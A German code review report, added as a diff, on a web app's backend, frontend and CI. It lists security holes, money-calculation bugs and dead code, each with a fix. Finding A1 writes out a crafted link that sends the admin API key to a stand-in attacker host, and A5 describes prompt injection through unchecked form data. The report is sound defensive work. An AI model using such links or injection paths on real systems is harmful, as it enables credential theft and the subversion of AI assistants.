@@ -1,0 +1,730 @@
+================================================================================
+MISSION CONTROL - CODE-CHECK
+Stand: 2026-09-11 · Branch main · Commit bb076ee
+Umfang: backend/ (index, middleware, routes, lib, utils, scripts, tests),
+        frontend/ (index.html, partner.html, partner-festpreis.html, sw.js,
+        manifest.json), .github/workflows/, Dockerfile, .env.example, CLAUDE.md
+Nicht geprueft: node_modules, Sheet-Inhalte, GCP-Konsole (kein Zugriff)
+Teststand: `npm test` in backend/ laeuft durch - 9 Suites, 158 Tests, alle gruen.
+================================================================================
+
+
+A. KRITISCH - SICHERHEIT
+================================================================================
+
+A1  mc_api_url ist per URL-Parameter setzbar und wird seitenuebergreifend
+    geteilt -> Admin-API-Key kann an fremden Host exfiltriert werden
+    frontend/partner.html:126-129, frontend/partner-festpreis.html:110-113,
+    frontend/index.html:2080
+
+    partner.html liest `?api=<url>` ungeprueft und schreibt den Wert nach
+    localStorage['mc_api_url']. index.html liest exakt denselben Key als
+    API_BASE. Beide Seiten liegen auf derselben Origin (jammifashion.github.io),
+    teilen also den localStorage.
+
+    Folge: Ein praeparierter Link
+        .../partner.html?token=X&api=https://angreifer.example
+    setzt die Backend-URL persistent. Oeffnet dieselbe Person danach
+    index.html, schickt apiFetch() den Header `X-API-Key: <MC_API_KEY>` an den
+    fremden Host - der Admin-Key des gesamten Backends. Zusaetzlich geht bei
+    jedem Partner-Aufruf `Authorization: Bearer <Partner-Token>` dorthin.
+
+    Der Parameter ist kein Versehen: laut bugfix.md (2026-06-09) haengt die
+    "Link kopieren"-Funktion im Partnerportal `&api=...` aktiv an jeden
+    generierten Portal-Link. Die Funktion wird also benutzt.
+
+    Empfehlung: Backend-URL fest im Code verankern (wie index.html es bereits
+    tut) und `?api=` entfernen. Falls konfigurierbar bleiben muss: gegen eine
+    Allowlist pruefen und getrennte localStorage-Keys je Seite verwenden
+    (mc_api_url_admin / mc_api_url_partner).
+
+
+A2  POST /api/partner/:id/eigenauftrag hat keinerlei Authentifizierung
+    backend/routes/partnerPortal.js:604-712, backend/index.js:51
+
+    Die Route ist vor `requireApiKey` gemountet und prueft selbst keinen Token.
+    Sie ruft weder extractToken() noch resolvePartner() auf - geprueft wird nur,
+    ob die Partner-ID im Sheet existiert (findPartner, Zeile 638).
+
+    Der Kommentar ueber der Route sagt: "Die Partner-ID wird zuvor ueber die
+    Token-Auth der Portalseite ermittelt und hier im Pfad mitgegeben." Das
+    beschreibt, was das Frontend tut - nicht, was das Backend erzwingt.
+
+    Folge: Wer eine Partner-ID kennt oder erraet, kann ohne Token
+      - beliebige Zeilen in Partner_Interne_Bestellungen schreiben
+        (Bezeichnung ist Freitext, geht ungefiltert ins Sheet),
+      - Google-Chat-Benachrichtigungen ausloesen (Zeile 705),
+      - beim ersten Aufruf neue Spalten im Sheet anlegen lassen
+        (Kanal/Fulfillment, Zeile 645-679).
+    Rate-Limit: 100 Requests / 15 min / IP - reicht fuer wirksames Spamming.
+
+    Empfehlung: `const { partnerId } = await resolvePartner(extractToken(req));`
+    und req.params.id dagegen pruefen (oder den Pfadparameter ganz streichen
+    und die ID aus dem Token ziehen).
+
+
+A3  partnerView.js: toter, aber offener Endpunkt, der Partner-Tokens in die
+    Query-String legt
+    backend/routes/partnerView.js (114 Zeilen), backend/index.js:50
+
+    `app.use('/api/partner-view', partnerViewRouter)` steht vor requireApiKey.
+    Im gesamten frontend/ gibt es keinen einzigen Aufruf von /api/partner-view -
+    die Datei wird von nichts benutzt ("legacy, bleibt erhalten").
+
+    Die drei Routen (/me, /verkaeufe, /abrechnungen) nehmen den Partner-Token
+    als `?token=` entgegen, nicht als Authorization-Header wie der aktive
+    Nachfolger partnerPortal.js. Query-Parameter landen in Cloud-Run-
+    Request-Logs, in Proxy-Logs und in Referer-Headern. Es sind dieselben
+    Tokens aus demselben Partner-Tab wie im aktiven Portal.
+
+    Empfehlung: Datei und Mount loeschen. Wenn ein Uebergangszeitraum noetig
+    ist, mindestens auf den Bearer-Header umstellen.
+
+
+A4  Turnstile-Verifikation ist optional und damit wirkungslos
+    backend/routes/anfragen-chat.js:55-69
+
+        if (cfTurnstileToken) { ...verifizieren... }
+
+    Schickt der Client das Feld gar nicht mit, wird die Pruefung komplett
+    uebersprungen und die Anfrage normal verarbeitet. Ein Bot laesst das Feld
+    einfach weg. Uebrig bleiben Honeypot (Zeile 46) und Rate-Limit
+    (20/15 min/IP).
+
+    Jeder durchgelassene Request kostet einen echten Claude-Call
+    (chatCore.js:128, max_tokens 1536) und kann eine Sheet-Zeile erzeugen.
+
+    Empfehlung: Token bei der ersten Nachricht (messages.length <= 1)
+    verpflichtend machen und fehlenden Token mit 403 ablehnen.
+
+
+A5  sessionData wird ungeprueft und ungedeckelt in den System-Prompt gespiegelt
+    backend/routes/anfragen-chat.js:43,76 -> backend/lib/chatCore.js:52-54
+
+    `sessionData` kommt direkt aus req.body und wird per JSON.stringify in den
+    System-Block geschrieben ("AKTUELLER FORMULARSTAND"). Waehrend `messages`
+    sauber begrenzt wird (max. 20 Eintraege, je 500 Zeichen, Zeile 50/73),
+    hat sessionData weder Groessen- noch Schluessel- noch Typpruefung. Die
+    einzige Grenze ist express.json({ limit: '256kb' }).
+
+    Folge: (a) Prompt-Injection direkt in den System-Prompt - der Angreifer
+    schreibt in den privilegierten Teil des Kontexts, nicht in die User-Turns;
+    (b) Kostenverstaerkung: ~250 KB Muell pro Request in einen Claude-Call,
+    der public erreichbar ist.
+
+    Empfehlung: sessionData auf die im Prompt deklarierten Felder
+    (step, produktBeschreibung, menge, varianten, partnerId, kundeName,
+    kundeEmail, preisvorschlag, anmerkungenKunde, kanal) whitelisten und
+    jeden Wert wie in Zeile 97-99 laengenbegrenzen.
+
+
+A6  /api/health/full ist unauthentifiziert und loest pro Aufruf einen echten
+    Claude-Call aus - das Dashboard ruft es im Minutentakt
+    backend/middleware/auth.js:4, backend/routes/system.js:27-45,
+    frontend/index.html:2207,2215
+
+    OPEN_PATHS enthaelt '/api/health/full'. Die Route ruft checkClaude() auf,
+    das eine echte Anthropic-Message erzeugt, dazu WooCommerce system_status
+    und einen Sheets-Read.
+
+    Zwei Probleme, die sich addieren:
+      - Extern: jeder kann ohne Key Anthropic-, WC- und Sheets-Kontingent
+        verbrauchen, gedeckelt nur durch 100 Requests/15 min/IP.
+      - Intern: checkStatus() laeuft per setInterval alle 60 s
+        (frontend/index.html:2215). Ein dauerhaft offener Dashboard-Tab macht
+        ~1440 Claude-Calls + 1440 WC-Calls + 1440 Sheets-Calls pro Tag, nur
+        fuer einen Statuspunkt. Zwei offene Tabs verdoppeln das. Nebenbei
+        frisst das 15 der 100 Requests pro Rate-Limit-Fenster.
+
+    Empfehlung: checkClaude() aus dem Health-Check nehmen oder auf einen
+    Cache mit z.B. 10 min TTL legen; Intervall im Frontend auf 5 min
+    hochsetzen; /api/health/full hinter den API-Key stellen und fuer
+    Cloud-Run-Probes bei dem bereits vorhandenen /health bleiben.
+
+
+================================================================================
+B. HOCH - KORREKTHEIT UND GELD
+================================================================================
+
+B1  Fehlende Sheet-Spalten fallen still auf 0 zurueck - mitten in der
+    Abrechnung
+    backend/utils/partner-kalkulation.js:59-80, 86-93
+
+    getKostenSatz() loest Position/Wert/Gueltig_ab ueber header.indexOf() auf,
+    ohne das Ergebnis zu pruefen. Bei -1 liest r[-1] -> undefined -> '' -> kein
+    Treffer -> `return null`. parseKonfiguration() uebernimmt daraufhin
+    DEFAULT_KONFIG, und darin sind alle Kostenpositionen 0.
+
+    Konkretes Szenario: Jemand benennt im Reiter Kalkulation_Fixkosten die
+    Spalte "Gueltig_ab" um oder fuegt ein Leerzeichen ein. Ab sofort rechnet
+    berechnePartnerAnteil() mit
+        herstellungsnebenkosten = 0, versandnebenkosten = 0, porto = 0,
+        paypal = 0
+    weiter. gewinnNetto steigt, partnerAnteil steigt, und jede Abrechnung wird
+    zu hoch. Kein Fehler, kein Log, HTTP 200.
+
+    Genau dieser Fehlermodus ist in backend/utils/sheet-headers.js:6-9 als
+    Regel 2 dokumentiert - und requireHeader() existiert, um ihn zu
+    verhindern. Es wird hier nur nicht benutzt (siehe B2).
+
+    Empfehlung: In getKostenSatz() requireHeader() fuer Position/Wert/
+    Gueltig_ab verwenden. Ein 500er ist hier deutlich billiger als eine
+    stille Fehlberechnung.
+
+
+B2  sheet-headers.js wird ausgerechnet in den Geld-Routen nicht verwendet
+    backend/utils/sheet-headers.js vs. kalkulation.js, partnerPortal.js,
+    festpreis-portal.js, festpreis-public.js, partner-artikel.js,
+    partnerView.js, anfragen.js
+
+    Importiert wird die zentrale Header-Aufloesung nur von:
+        backend/routes/auftragsmonitor.js:5
+        backend/routes/sheets.js:4
+        backend/scripts/migrate-varianten.js:7
+
+    Alle uebrigen Routen definieren stattdessen lokal `const h = col =>
+    header.indexOf(col)` und lesen mit `r[h('X')] ?? ''`. Das ist exakt das
+    Muster, das sheet-headers.js ersetzen sollte. Die beiden Dateien, die es
+    nutzen, sind Lese-Routen; die Dateien, die Abrechnungen, Salden und
+    Lizenzgebuehren berechnen, nutzen es nicht.
+
+    Betroffene Stellen mit direkter Geld- oder Schreibwirkung, exemplarisch:
+        kalkulation.js:367,676      Append in Verkaeufe/Abrechnungen
+        partnerPortal.js:536-543    Lizenz- und Interne-Summe fuer den Saldo
+        festpreis-public.js:130-135 Offene FP-Verkaeufe fuer die Auszahlung
+        anfragen.js:215,221         colLetter(h('Status')) im Schreib-Range
+
+    Sonderfall anfragen.js:215: bei fehlendem Header ist h(...) = -1,
+    colLetter(-1) liefert '' (Schleife laeuft null Mal), der Range wird zu
+    `Kundenanfragen!5` - ein kaputter Schreib-Range, kein sauberer Fehler.
+
+    Empfehlung: schrittweise auf requireHeader()/findHeader() umstellen,
+    beginnend bei partner-kalkulation.js, kalkulation.js und
+    festpreis-portal.js.
+
+
+B3  buildStornoRows mischt Header-Lookup und fest verdrahtete Spaltenindizes
+    backend/utils/sync-logic.js:23-67
+
+    In derselben Funktion:
+        ordIdx = vh('Order-ID')           <- folgt dem Header
+        artIdx = vh('Artikelnummer')      <- folgt dem Header
+        NEG_COLS   = [5,6,7,10,11,12,13]  <- fest
+        STATUS_COL = 8                    <- fest
+        DATE_COL   = 1                    <- fest
+        STORNO_COL = 14                   <- fest
+
+    Wird im Reiter Partner_Verkaeufe eine Spalte eingefuegt, wandern die
+    vh()-Lookups korrekt mit, die festen Indizes nicht. Die Gegenbuchung
+    negiert dann die falschen Zellen und setzt Status/Storno-Marker an die
+    falsche Stelle. Die Duplikaterkennung (Zeile 41-43, r[STORNO_COL]) greift
+    ebenfalls daneben, also werden Stornos doppelt gebucht.
+
+    Das ist eine stille Korruption der Storno-Buchungen - sie faellt erst bei
+    der naechsten Abrechnung auf, wenn ueberhaupt.
+
+    Empfehlung: alle Indizes ueber vh() aufloesen; solange das nicht
+    passiert, mindestens eine Zusicherung, dass die Positionen von Status und
+    Storno-Status den Erwartungen entsprechen - andernfalls abbrechen.
+
+
+B4  /api/claude/chat bricht ab dem 6. Turn einer Session mit einem API-Fehler
+    backend/routes/claude.js:14,35-46
+
+        const history = conversationHistory.get(session_id) || [];
+        history.push({ role: 'user', content: ... });
+        const trimmed = history.slice(-MAX_HISTORY);   // MAX_HISTORY = 10
+
+    Ablauf: Nach Turn 5 stehen 10 Eintraege im Verlauf [u,a,u,a,u,a,u,a,u,a].
+    In Turn 6 wird die User-Nachricht angehaengt (11 Eintraege) und
+    slice(-10) schneidet den ersten ab. `trimmed[0]` ist damit eine
+    assistant-Nachricht. Die Anthropic Messages API verlangt eine
+    user-Nachricht an erster Stelle und antwortet mit 400.
+
+    Der Fehler faellt in den globalen Error-Handler (index.js:77) - der Nutzer
+    sieht ab dem 6. Turn nur noch eine Fehlermeldung, bis er den Chat leert.
+
+    Empfehlung: nach dem Slice fuehrende assistant-Nachrichten abschneiden:
+        while (trimmed.length && trimmed[0].role !== 'user') trimmed.shift();
+
+
+B5  conversationHistory waechst unbegrenzt und ist auf Cloud Run nicht
+    zuverlaessig
+    backend/routes/claude.js:15,55
+
+    Eine prozesslokale Map, gefuellt mit client-gewaehlten session_id-Werten.
+    Es gibt keine TTL und keine Groessenbegrenzung - geraeumt wird nur ueber
+    DELETE /chat/:session_id, falls es jemand aufruft. Bei 512 Mi
+    (deploy-backend.yml) ist das ein langsames Speicherleck.
+
+    Zweitens laeuft der Dienst mit --max-instances 2 und ohne Session
+    Affinity. Requests derselben Chat-Sitzung landen zufaellig auf Instanz A
+    oder B, die je einen eigenen Verlauf halten. Der Chat "vergisst" dann
+    sporadisch - ein Verhalten, das sich kaum reproduzieren laesst.
+
+    Empfehlung: TTL + Obergrenze (z.B. LRU, 200 Sessions, 60 min), oder den
+    Verlauf wie beim Kundenchat vom Client mitschicken lassen.
+
+
+B6  Feste Zeilen- und Spaltenlimits in Sheet-Reads, ohne Erkennung beim
+    Anschlagen
+    backend/routes/sheets.js:45,217,603,621,664,704
+    sowie readTab in 6 weiteren Dateien (Range 'A1:Z')
+
+        readRange(tab, range = 'A1:Z1000')      Default
+        readRange(TAB_VARIANTEN, 'A1:L2000')
+        readRange(TAB_PS,        'A1:J5000')    4x
+
+    Wird ein Reiter groesser als das Limit, liefert die API stillschweigend
+    weniger Zeilen. Ein Produkt jenseits Zeile 1000 existiert fuer das
+    Backend nicht mehr - es gibt keine Meldung, nur ein leeres Suchergebnis.
+    Dasselbe gilt fuer die Spaltengrenze Z (26 Spalten) bei allen readTab-
+    Varianten.
+
+    Besonders zu beachten: partnerPortal.js legt im Eigenauftrag-Pfad bei
+    Bedarf neue Spalten an (Kanal, Fulfillment, Zeile 645-679) - die Breite
+    von Partner_Interne_Bestellungen waechst also im Betrieb, waehrend alle
+    Leser bei Z gedeckelt sind.
+
+    Empfehlung: Ranges ohne Zeilenlimit schreiben ('A1:Z' statt 'A1:Z1000',
+    'A:J' statt 'A1:J5000'); wo ein Limit bleiben muss, bei Erreichen der
+    Grenze warnen.
+
+
+B7  ID-Vergabe ohne Sperre - doppelte Abrechnungs- und Anfrage-IDs moeglich
+    backend/routes/kalkulation.js:69-79 (nextAbrechnungId),
+    backend/routes/anfragen-chat.js:26-34 (generateAnfrageId)
+
+    Beide lesen das Maximum der bestehenden IDs und haengen max+1 an. Zwischen
+    Lesen und Append gibt es keine Sperre. Zwei parallele Requests erzeugen
+    dieselbe ID.
+
+    Bei Abrechnungen ist das relevant, weil PATCH /abrechnung/:id/status und
+    DELETE /abrechnung/:id ueber diese ID adressieren - zwei Zeilen mit
+    AB-2026-0007 machen Statuswechsel und Loeschung mehrdeutig.
+    generateAnfrageId haengt zusaetzlich am oeffentlichen Chat-Endpunkt, wo
+    parallele Zugriffe aus verschiedenen IPs realistisch sind.
+
+    Nebenbefund, gleiche Stelle: nextAbrechnungId nutzt getUTCFullYear(),
+    generateAnfrageId das lokale getFullYear(). Am Jahreswechsel vergeben
+    beide zwischen 00:00 und 01:00 MEZ unterschiedliche Jahrespraefixe.
+
+
+B8  netto und brutto werden unabhaengig gerundet und driften auseinander
+    backend/utils/partner-kalkulation.js:174,186-187
+
+        partnerAnteilBrutto = round2(partnerAnteil * (1 + mwst/100))
+        netto:  round2(partnerAnteil)
+        brutto: partnerAnteilBrutto
+
+    brutto entsteht aus dem ungerundeten partnerAnteil, netto aus dem
+    gerundeten. Damit gilt nicht durchgaengig brutto == round2(netto * 1,19).
+    Werden ueber viele Positionen einmal die Netto- und einmal die
+    Brutto-Werte summiert, weichen die beiden Summen um Cent-Betraege ab -
+    auf einer Abrechnung faellt genau das auf.
+
+    Empfehlung: einen der beiden Werte als fuehrend festlegen und den anderen
+    daraus ableiten.
+
+
+B9  portoModell wird nicht validiert - jeder unbekannte Wert bedeutet
+    still 50/50
+    backend/utils/partner-kalkulation.js:166-168
+
+        portoModell === 'partner-trägt' ? voll : haelfte
+
+    Ein Tippfehler im Sheet, ein nachgestelltes Leerzeichen oder eine
+    abweichende Unicode-Normalform des "ä" (NFD statt NFC - entsteht beim
+    Kopieren aus macOS oder manchen PDFs) fuehrt lautlos zur 50/50-Variante.
+    Der Partner bekommt dann die Haelfte des Porto-Saldos statt alles, ohne
+    dass irgendwo ein Hinweis auftaucht.
+
+    Empfehlung: Wert normalisieren (trim + normalize('NFC')) und gegen eine
+    Enum pruefen; unbekannte Werte loggen statt still zu defaulten.
+
+
+================================================================================
+C. MITTEL - INKONSISTENZEN UND BETRIEB
+================================================================================
+
+C1  Zwei verschiedene API-Key-Pruefungen, eine davon mit Bypass bei
+    fehlendem Secret
+    backend/middleware/auth.js:18-22 vs. backend/routes/partnerPortal.js:393,414
+
+    Kanonisch (auth.js):
+        if (!key || key !== expected) -> 401
+    Lokal (partnerPortal.js, beide Sync-Routen):
+        if (req.headers['x-api-key'] !== process.env.MC_API_KEY) -> 401
+
+    Die lokale Variante hat keinen Leer-Guard. Ist MC_API_KEY nicht in
+    process.env gesetzt, vergleicht sie `undefined !== undefined` -> false ->
+    die Pruefung laesst durch. Die Routen sind vor requireApiKey gemountet,
+    es gibt also keine zweite Schranke.
+
+    In der Praxis faengt loadAllSecrets() leere Secrets ab (secrets.js:74-84),
+    der Bypass ist heute nicht erreichbar. Er ist trotzdem die falsche
+    Reihenfolge der Verteidigung: eine Schranke sollte nicht davon abhaengen,
+    dass eine andere Datei vorher richtig abgebrochen hat.
+
+    Zusaetzlich liest die lokale Variante process.env direkt statt
+    getSecret() - damit greift die 12-h-Secret-Rotation (secrets.js:4) fuer
+    diese beiden Routen nicht.
+
+    Empfehlung: requireApiKey als Middleware direkt auf die beiden
+    Sync-Routen legen (router.post('/verkaeufe/sync-all', requireApiKey, ...)).
+
+
+C2  Zwei unterschiedliche Sichtbarkeitsregeln fuer Abrechnungen
+    backend/routes/partnerPortal.js:576-577 vs. festpreis-public.js:166
+
+    Lizenz-Partner (Allowlist):
+        VISIBLE = new Set(['freigegeben', 'bezahlt'])
+    Festpreis-Partner (Denylist):
+        (r[header.indexOf('Status')] ?? '') !== 'entwurf'
+
+    Die Denylist ist die schwaechere Variante: kommt irgendwann ein neuer
+    Status hinzu (storniert, in Pruefung, zurueckgestellt), ist er fuer
+    FP-Partner sofort sichtbar, fuer Lizenz-Partner nicht. Dieselbe fachliche
+    Frage - "was darf ein Partner sehen" - wird an zwei Stellen
+    gegensaetzlich beantwortet.
+
+    Empfehlung: beide auf die Allowlist umstellen.
+
+
+C3  resolvePartner existiert dreimal, mit unterschiedlicher Sorgfalt
+    partnerPortal.js:128-150, festpreis-public.js:51-63, partnerView.js:27-47
+
+    festpreis-public.js prueft `tokenIdx !== -1` vor dem Vergleich.
+    partnerPortal.js und partnerView.js tun das nicht. Fehlt die Spalte
+    "Token", vergleicht r[-1] ?? '' gegen den Token - kein Treffer, 401 fuer
+    alle. Das ist hier zufaellig das sichere Ergebnis, aber nicht als
+    Entscheidung erkennbar.
+
+    Ebenfalls in allen drei Kopien: `partnerId = row[idIdx] ?? ''`. Fehlt
+    "Partner-ID", ist partnerId der leere String, und nachgelagerte Filter
+    wie `r[h('Partner-ID')] === partnerId` (partnerPortal.js:536) matchen
+    dann alle Zeilen mit leerer Partner-ID - Daten anderer Partner koennten
+    sichtbar werden.
+
+    Dieselbe Vervielfachung betrifft readTab (6 Kopien), toFloat (5),
+    colLetter (2), getSheets (8). Die readTab-Kopien sind nicht identisch:
+    partnerPortal/kalkulation haengen `_sheetRow` an, festpreis-public und
+    partnerView nicht.
+
+    Empfehlung: nach backend/utils/ ziehen, so wie es fuer
+    sheet-headers.js/sheet-rows.js bereits gemacht wurde.
+
+
+C4  UTC und Ortszeit werden gemischt beim Erzeugen von Datumswerten
+    backend/utils/sync-logic.js:9-12 (toDE, getUTC*)
+    backend/routes/anfragen-chat.js:21-24 (todayDE, lokale Zeit)
+    backend/routes/kalkulation.js:70 (getUTCFullYear)
+    backend/utils/sheet-rows.js:21 (toLocaleDateString('de-DE'))
+
+    Vier Stellen erzeugen dasselbe Format "TT.MM.JJJJ" aus zwei
+    verschiedenen Zeitbasen. Zwischen 00:00 und 01:00 MEZ (bzw. 02:00 MESZ)
+    schreiben sie unterschiedliche Tage. parseDate in partnerPortal.js:52
+    interpretiert anschliessend wieder als UTC-Mitternacht. Solange niemand
+    nachts arbeitet, faellt es nicht auf - es ist aber kein Zustand, auf den
+    man sich verlassen sollte, wenn Zeitraeume von Abrechnungen daran haengen.
+
+    Empfehlung: eine gemeinsame Datumsfunktion in utils/, mit einer
+    festgelegten Zeitzone (Europe/Berlin).
+
+
+C5  Zwei Cronjobs laufen zur selben Minute - Backup gegen Sync
+    .github/workflows/backup-daily.yml:5 und sync-partner-daily.yml:5
+
+    Beide auf `cron: '0 3 * * *'`. Das Backup kopiert das Google Sheet,
+    waehrend sync-all neue Verkaufszeilen und Storno-Gegenbuchungen
+    hineinschreibt. Das Backup kann damit einen halb geschriebenen Stand
+    festhalten - also genau dann unbrauchbar sein, wenn man es braucht.
+
+    Empfehlung: Backup auf 0 2 * * * vorziehen oder auf 0 4 * * * schieben.
+
+
+C6  Kein CI-Lauf der Tests
+    .github/workflows/ (5 Workflows, keiner ruft npm test)
+
+    backend/tests/ enthaelt 9 Suites mit 158 Tests, die lokal alle gruen sind
+    - unter anderem fuer kalkulation, sync und seo-prompt. deploy-backend.yml
+    baut und deployt bei jedem Push auf backend/** direkt nach Cloud Run,
+    ohne die Tests auszufuehren.
+
+    Empfehlung: Test-Job vor dem Deploy-Job, `needs: test`.
+
+
+C7  Deploy nimmt :latest statt des gebauten Commits
+    .github/workflows/deploy-backend.yml:37-40 vs. 47
+
+    Gebaut und gepusht werden `:${{ github.sha }}` und `:latest`, deployt
+    wird `:latest`. Damit ist nicht festgelegt, welcher Commit tatsaechlich
+    laeuft, wenn zwei Pushes kurz hintereinander kommen - der zweite Build
+    kann den ersten Deploy ueberholen. Ein Rollback per Re-Run des alten
+    Workflows ist ebenfalls nicht moeglich.
+
+    Empfehlung: `--image .../backend:${{ github.sha }}`.
+
+
+C8  google-credentials.json im backend/-Verzeichnis landet im Docker-Image
+    .dockerignore:3, backend/google-credentials.json (lokal vorhanden)
+
+    .dockerignore enthaelt `google-credentials.json`. Dieses Muster ohne
+    Pfadanteil greift nur auf der obersten Ebene des Build-Kontexts. Die
+    Datei liegt aber unter backend/ und wird von `COPY backend/ ./backend/`
+    (Dockerfile:6) mit ins Image kopiert.
+
+    In CI ist das folgenlos: actions/checkout holt nur versionierte Dateien,
+    und .gitignore schliesst `*-credentials.json` korrekt aus. Ein lokaler
+    `docker build` aus diesem Arbeitsverzeichnis backt den Service-Account-
+    Key dagegen heute schon ins Image.
+
+    Empfehlung: `**/google-credentials.json` und `**/*-credentials.json` in
+    .dockerignore.
+
+
+C9  getApiKey() speichert einen leeren Key dauerhaft und fragt nie wieder
+    frontend/index.html:2082-2089
+
+        let key = localStorage.getItem('mc_api_key');
+        if (key === null) {
+          key = (prompt(...) ?? '').trim();
+          localStorage.setItem('mc_api_key', key);
+        }
+
+    Bricht die Person den Prompt ab (Escape/Abbrechen), liefert prompt()
+    null, `?? ''` macht daraus den leeren String, und der wird gespeichert.
+    Beim naechsten Laden ist `key === null` falsch - es wird nicht mehr
+    gefragt. Das Dashboard antwortet ab da nur noch mit 401, und der einzige
+    Ausweg ist, localStorage manuell zu leeren.
+
+    Empfehlung: nur speichern, wenn der Wert nicht leer ist; bei 401 aus
+    apiFetch den Key verwerfen und neu fragen.
+
+
+C10 Service Worker liefert index.html cache-first, ohne dass ein Deploy den
+    Cache invalidiert
+    frontend/sw.js:1,3-6,47-59 vs. .github/workflows/deploy.yml
+
+        CACHE_NAME = 'mission-control-v9'
+        PRECACHE   = ['./index.html', './manifest.json']
+        return cached || networkFetch;
+
+    `cached || networkFetch` gibt die gecachte Seite sofort zurueck; die
+    Netzwerkantwort aktualisiert zwar den Cache, aber erst fuer den
+    uebernaechsten Aufruf. Alte Caches werden nur geloescht, wenn CACHE_NAME
+    sich aendert - und das passiert nur von Hand. deploy.yml laedt
+    frontend/ hoch, ohne sw.js anzufassen.
+
+    Folge: Nach einem Frontend-Deploy sehen bestehende Installationen noch
+    die alte Oberflaeche, teils ueber mehrere Reloads.
+
+    Empfehlung: CACHE_NAME im Deploy aus github.sha generieren, oder fuer
+    index.html auf network-first umstellen.
+
+
+C11 Fehlermeldungen des Servers werden per innerHTML gerendert
+    frontend/partner.html:181-186 (showError), analog partner-festpreis.html
+
+        main.innerHTML = `<div class="error-box"><p>${msg}</p></div>`;
+
+    msg stammt aus body.error der API-Antwort. Ausserhalb von production
+    liefert der Error-Handler (index.js:81) err.stack; MissingHeaderError
+    (sheet-headers.js:19-21) nimmt Spaltennamen aus dem Sheet mit auf. Das
+    ist keine direkt ausnutzbare Luecke, aber Markup aus einer Quelle, die
+    hier ungeprueft durchgereicht wird.
+
+    Empfehlung: textContent statt innerHTML fuer die Meldung.
+
+
+================================================================================
+D. TOTE PUNKTE
+================================================================================
+
+D1  backend/routes/partnerView.js - die gesamte Datei
+    Keine Referenz in frontend/. Siehe A3 (offener Endpunkt, Token in der
+    Query). Loeschkandidat Nummer eins.
+
+D2  partnerIdExists() in partnerPortal.js:90-92
+    Definiert, nirgends aufgerufen. Die tatsaechlich benutzte Kopie steht in
+    partner-artikel.js:67. In partnerPortal.js wird stattdessen direkt
+    findPartner() verwendet (Zeile 638).
+
+D3  Der !result-Zweig in anfragen-chat.js:78-80
+        if (!result) return res.status(502).json({ ... });
+    callChatAgent() kann seit dem Umbau kein null mehr liefern - es wirft
+    stattdessen (chatCore.js:145-150, der Kommentar dort sagt es explizit:
+    "frueher wurde in dem Fall still null geliefert"). Der Zweig ist nicht
+    mehr erreichbar.
+
+D4  OPEN_PATHS-Eintrag '/api/health' in middleware/auth.js:4
+    systemRoutes definiert nur '/full' und '/log', kein '/'. GET /api/health
+    passiert die Auth-Schranke und landet dann im 404-Handler
+    (index.js:74). Der Eintrag oeffnet einen Pfad, den es nicht gibt.
+
+D5  Doppelter Mount von systemRoutes
+    index.js:65 ('/api/system') und index.js:71 ('/api/health')
+    Ergebnis: /api/system/full und /api/health/full sind dieselbe Route,
+    ebenso /api/system/log und /api/health/log. Das Frontend nutzt nur
+    /api/health/full (index.html:2207). Die jeweils andere Schreibweise ist
+    unbeabsichtigtes Beiwerk.
+
+D6  frontend/icons/ existiert nicht
+    manifest.json:11-24 verweist auf icons/icon-192.png und
+    icons/icon-512.png. Das Verzeichnis gibt es in frontend/ nicht (nur
+    anfrage.html, index.html, manifest.json, partner-festpreis.html,
+    partner.html, sw.js). Die PWA-Installation hat damit kein Icon;
+    Browser protokollieren das als Manifest-Fehler.
+
+D7  HEALTHCHECK im Dockerfile (Zeile 9-10)
+    Cloud Run wertet Docker-HEALTHCHECK nicht aus - die Anweisung hat im
+    Zielbetrieb keine Wirkung. Harmlos, aber sie suggeriert eine Pruefung,
+    die nicht stattfindet.
+
+D8  updateShopBadge: artikelTab.style.display = ''
+    frontend/index.html:2112-2113
+    Setzt display bedingungslos auf den Default zurueck, es gibt keine
+    Gegenstelle, die ihn je auf 'none' setzt. Rest einer entfernten
+    shop-abhaengigen Einblendung.
+
+D9  Fehlende action in der Fehlermeldung von /generate-product
+    backend/routes/claude.js:318
+        'Unbekannte action. Erwartet: generate_description, seo_description
+         oder generate_variants'
+    'suggest_variants' wird ab Zeile 127 behandelt, fehlt aber in der
+    Aufzaehlung.
+
+D10 shopConfig.wpAppUser ist eine Konstante, der Guard darauf ist tot
+    backend/lib/shopConfig.js:18,29 und backend/routes/artikel.js:32
+        wpAppUser: 'WP_APP_PASSWORD'        (Literal, nie leer)
+        if (!cfg.wcUrl || !cfg.wpAppUser || !cfg.wpAppPassword)
+    Der mittlere Teil kann nie zutreffen. Laut .env.example ist der
+    WordPress-Benutzer tatsaechlich so benannt, das ist also Absicht - aber
+    ein Name, der wie ein Platzhalter aussieht und beim naechsten Lesen
+    zuverlaessig fuer einen Bug gehalten wird. Ein eigenes, benanntes Feld
+    (wpUser: 'mc-redakteur') waere eindeutiger.
+
+
+================================================================================
+E. DOKUMENTATIONS-DRIFT (CLAUDE.md)
+================================================================================
+
+E1  Saemtliche Zeilennummern der Sektionsliste sind veraltet - im Schnitt um
+    rund 1100 Zeilen.
+
+        CLAUDE.md sagt         tatsaechlich (grep "SECTION" frontend/index.html)
+        Navigation      1072   ->  2186
+        Helpers         1104   ->  2220
+        Auftragsmonitor 1207   ->  2323
+        Shop Orders     1801   ->  (nicht mehr als SECTION vorhanden)
+        Artikelerfassung 1978  ->  3259
+        SEO-Flow        2664   ->  4195
+        Kundenanfragen  4222   ->  5347
+        Settings        3604   ->  5632
+        Partnerportal   3724   ->  6056
+        Partner-Artikel ~4532  ->  7242
+        Interne Best.   ~4710  ->  7648
+        Fixkosten       ~4810  ->  7834
+
+    Drei Sektionen fehlen ganz in der Liste:
+        Auftragsmonitor Dual-Source (2338), Agent-Wissen (5674),
+        Festpreis-Tab (7875)
+
+    Auch die Anker im Quelltext tragen die alten Nummern mit sich herum
+    (index.html:2186 lautet woertlich "SECTION: Navigation (Zeile 1072)").
+    Das betrifft direkt die in CLAUDE.md vorgeschriebene Arbeitsweise
+    ("Vor jeder Aenderung erst Struktur pruefen").
+
+    Empfehlung: Zeilennummern aus den Ankern und aus CLAUDE.md entfernen -
+    der grep findet die Sektionen ueber den Namen, die Nummer veraltet
+    zwangslaeufig bei jeder Aenderung.
+
+E2  SECRET_KEYS-Liste unvollstaendig
+    CLAUDE.md nennt 15 Schluessel, secrets.js:7-24 enthaelt 16.
+    Es fehlt: GCHAT_WEBHOOK_URL.
+    (.env.example ist vollstaendig und deckt sich mit dem Code.)
+
